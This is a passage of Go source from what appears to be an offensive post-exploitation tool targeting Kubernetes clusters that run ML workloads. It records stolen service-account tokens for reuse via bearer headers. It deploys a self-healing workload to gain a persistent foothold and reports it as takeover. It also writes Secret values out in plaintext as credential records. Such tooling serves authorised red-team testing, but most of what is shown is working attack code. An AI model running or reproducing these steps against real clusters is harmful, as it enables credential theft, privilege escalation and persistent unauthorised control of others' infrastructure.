		"stolen SA bearer token — re-auth via --header \"Authorization: Bearer <token>\"")
	saCred[0]["chainable"] = credchain.IsChainableType("k8s-sa-token")
	finding.Metadata["extracted_credentials"] = saCred
	infof("sa-loot %s/%s: token_stolen=true escalation=%v (foothold_write=%v stolen_write=%v)", k8sNamespace, pod, escalation, footholdWrite, stolenWrite)
	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module: "k8s", Action: "sa-loot", ResourcesEnumerated: 1, Mutating: true,
	})
}

// k8sTargetNamespaces returns the namespaces a verb should operate over: every
// readable namespace when --all-namespaces is set, otherwise just --namespace.
func k8sTargetNamespaces(client *k8s.Client) ([]string, error) {
	if !k8sAllNamespaces {
		return []string{k8sNamespace}, nil
	}
	return client.ListNamespaces()
}

// k8sNamespaceScope is the human-facing label for the current namespace selection.
func k8sNamespaceScope() string {
	if k8sAllNamespaces {
		return "all namespaces"
	}
	return fmt.Sprintf("namespace %q", k8sNamespace)
}

func writeSuffix(canWrite bool) string {
	if canWrite {
		return " (incl. WRITE)"
	}
	return ""
}

// writeLabel renders a dry-run write-probe outcome for evidence.
func writeLabel(ok, canWrite bool) string {
	if !ok {
		return "unknown"
	}
	if canWrite {
		return "allowed"
	}
	return "denied"
}

// verbsSuffix appends the stolen identity's verbs to a description when its rule
// review succeeded (best-effort enrichment; absence does not change the verdict).
func verbsSuffix(review *k8s.AccessReview) string {
	if review != nil && review.Reviewed && len(review.Verbs) > 0 {
		return " Stolen identity verbs: " + strings.Join(review.Verbs, ",") + "."
	}
	return ""
}

// firstPodInNamespace returns the name of the first pod in the namespace,
// preferring a model-server-labelled pod when present.
func runK8SPersist(cmd *cobra.Command, args []string) error {
	if strings.TrimSpace(k8sTarget) == "" {
		return missingFlagError("target", formatCommandExample("k8s --target https://127.0.0.1:6443 --insecure persist --namespace ml-prod --force-exploit"))
	}
	if err := requireForceExploit("k8s persist"); err != nil {
		return err
	}
	client, err := k8sClientFactory()
	if err != nil {
		return err
	}

	res, err := client.DeployPersistenceWorkload(k8sNamespace)
	if err != nil {
		// The identity could not create the Deployment (e.g. 403). No persistence claim.
		finding := newExploitFinding(
			report.SourceK8s, k8sTarget,
			fmt.Sprintf("Kubernetes persistence deploy failed: %s", k8sNamespace),
			report.SeverityMedium,
			fmt.Sprintf("Could not deploy a persistence workload in %q (%v) — persistence not achieved (the identity likely lacks deployments:create; steal a privileged token with sa-loot and pass it via --header).", k8sNamespace, outcomeAnnotate(err)),
			map[string]interface{}{
				"module": "k8s", "action": "persist", "provider": "k8s", "mutating": true,
				"namespace": k8sNamespace, "deployed": false,
			},
		)
		finding.Metadata = applyStageLanded(finding.Metadata, "access", "reachable", "k8s-persist", "workload-deploy")
		return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
			Module: "k8s", Action: "persist", ResourcesEnumerated: 0, Mutating: true, PartialFailures: 1,
		})
	}

	// Poll briefly for the cluster to actually run the workload (Deployment -> pod).
	var podName, phase string
	for i := 0; i < 8; i++ {
		podName, phase = client.WorkloadScheduled(k8sNamespace, res.Name)
		if phase == "Running" {
			break
		}
		time.Sleep(2 * time.Second)
	}
	running := phase == "Running"

	// Honest classification: a Running pod means the cluster is executing our
	// self-healing workload = persistent takeover. Deployed-but-not-Running is only
	// an accepted mutation (influenced), not a confirmed foothold.
	stage, landed, severity := "impact", "influenced", report.SeverityHigh
	title := fmt.Sprintf("Kubernetes persistence workload deployed (running unconfirmed): %s/%s", k8sNamespace, res.Name)
	desc := fmt.Sprintf("Deployed a self-healing Deployment %q in %q under the current identity; the API server accepted it but a Running pod was not observed in the poll window (pod=%s phase=%s).", res.Name, k8sNamespace, safeLabel(podName), safeLabel(phase))
	if running {
		stage, landed, severity = "own", "takeover-capable", report.SeverityCritical
		title = fmt.Sprintf("Kubernetes persistence achieved: %s/%s running", k8sNamespace, res.Name)
		desc = fmt.Sprintf("Deployed a self-healing Deployment %q in %q; the cluster is running our workload (pod %s, phase Running) and will restart it if killed — a persistent foothold. Bounded canary payload (marker %s). Clean up: kubectl -n %s delete deployment %s.", res.Name, k8sNamespace, podName, res.Marker, k8sNamespace, res.Name)
	}
	if res.AlreadyExists {
		desc += " A prior aipostex-persist deployment was already present (persistence idempotent)."
	}

	finding := newExploitFinding(
		report.SourceK8s, k8sTarget, title, severity, desc,
		map[string]interface{}{
			"module": "k8s", "action": "persist", "provider": "k8s", "mutating": true,
			"namespace": k8sNamespace, "workload": res.Name, "deployed": res.Deployed,
			"already_exists": res.AlreadyExists, "pod": podName, "pod_phase": phase, "running": running,
		},
	)
	finding.Evidence = res.Manifest
	if podName != "" {
		finding.Evidence += fmt.Sprintf("\n\npod: %s\nphase: %s", podName, phase)
	}
	finding.Metadata = applyStageLanded(finding.Metadata, stage, landed, "k8s-persist", "workload-persistence")
	plan := buildK8sExploitWorkflowPlan(k8sTarget, "persist", k8sNamespace)
	finding.Metadata = attachWorkflowToMetadata(finding.Metadata, plan)
	infof("k8s persist: workload=%s deployed=%v running=%v", res.Name, res.Deployed, running)
	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module: "k8s", Action: "persist", ResourcesEnumerated: 1, Mutating: true,
		WorkflowPlans: []workflowPlan{plan},
	})
}

func firstPodInNamespace(client *k8s.Client, namespace string) (string, error) {
	workloads, err := client.EnumerateWorkloads(namespace)
	if err != nil && len(workloads) == 0 {
		return "", err
	}
	var firstPod string
	for _, wl := range workloads {
		if wl.Kind != "Pod" {
			continue
		}
		if firstPod == "" {
			firstPod = wl.Name
		}
		if wl.Labels["component"] == "model-server" {
			return wl.Name, nil
		}
	}
	if firstPod == "" {
		return "", fmt.Errorf("no pods found in namespace %q; specify --pod", namespace)
	}
	return firstPod, nil
}

func k8sEnumSeverity(workloads, crds int) string {
	if workloads == 0 && crds == 0 {
		return report.SeverityInfo
	}
	return report.SeverityMedium
}

func k8sEnumEvidence(workloads []k8s.Workload, crds []k8s.CRDInfo) string {
	var b strings.Builder
	for _, wl := range workloads {
		fmt.Fprintf(&b, "%s/%s%s\n", wl.Kind, wl.Name, imageSuffix(wl.Image))
	}
	for _, crd := range crds {
		if mlRelevantCRD(crd.Group) {
			fmt.Fprintf(&b, "CRD %s (%s)\n", crd.Name, crd.Kind)
		}
	}
	return strings.TrimRight(b.String(), "\n")
}

func secretEvidence(secret k8s.SecretInfo) string {
	var b strings.Builder
	fmt.Fprintf(&b, "Secret: %s/%s (type=%s)\n", secret.Namespace, secret.Name, secret.Type)
	for _, k := range secret.Keys {
		fmt.Fprintf(&b, "  %s=%s\n", k, secret.Values[k])
	}
	return strings.TrimRight(b.String(), "\n")
}

// secretCredentials builds structured credential records from a decoded Secret so the
// console creds: block and `report view --credentials` list each key with its real
// plaintext value. Shape matches the wandb/ray/kubeflow modules.
func secretCredentials(secret k8s.SecretInfo, target string) []map[string]interface{} {
	if len(secret.Keys) == 0 {
		return nil
	}
	creds := make([]map[string]interface{}, 0, len(secret.Keys))
	for _, k := range secret.Keys {
		creds = append(creds, map[string]interface{}{
			"type":          "k8s-secret",
			"name":          k,
			"value":         secret.Values[k],
			"source_label":  "k8s-secret-read",
			"source_target": target,
			"target_url":    target,
			"chainable":     false,
			"note":          fmt.Sprintf("secret %s/%s (type=%s)", secret.Namespace, secret.Name, secret.Type),
		})
	}
	return creds
}

// mlRelevantCRD reports whether a CRD group belongs to a known ML serving or
// orchestration platform, so enum highlights ML CRDs without listing every
// builtin k3s/helm CRD.
func mlRelevantCRD(group string) bool {
	g := strings.ToLower(group)
	for _, marker := range []string{"kserve", "kubeflow", "seldon", "ray.io", "mlflow", "machinelearning", "serving"} {
		if strings.Contains(g, marker) {
			return true
		}
	}
	return false
}

func imageSuffix(image string) string {
	if strings.TrimSpace(image) == "" {
		return ""
	}
	return " (image=" + image + ")"
}

func defaultLabel(value, fallback string) string {
	if strings.TrimSpace(value) == "" {
		return fallback
	}
	return value
}
